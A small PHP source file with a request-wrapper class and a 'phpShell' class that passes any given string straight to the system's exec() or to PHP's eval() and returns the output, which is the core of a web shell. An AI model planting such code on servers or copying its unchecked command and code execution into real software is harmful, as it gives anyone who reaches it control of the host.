<?php

/**
 * Request Wrapper
 * @author gabe@fijiwebdesign.com
 */
class Req {
	
	function getVar($name, $default = null) {
		return isset($_REQUEST[$name]) ? $_REQUEST[$name] : $default;
	}
	
	function getPostVar($name, $default = null) {
		return isset($_POST[$name]) ? $_POST[$name] : $default;
	}
}

/**
 * PHP Shell Methods
 * @return 
 */
class phpShell {
	
	function phpShell() {
		
	}
	
	/**
	 * Execute a System Command
	 * @return String Output
	 * @param $cmd String
	 */
	function exec($cmd) {
		$line = exec($cmd, $lines);
		return implode("\n", $lines);
	}
	
	/**
	 * Execute a PHP Command
	 * @return String Output
	 * @param $cmd String
	 */
	function execPHP($cmd) {
		ob_start();
        $cmd=stripslashes($cmd);
		eval($cmd);
		$contents = ob_get_contents();
		ob_clean();
		return $contents;
	}
	
	
}


?>
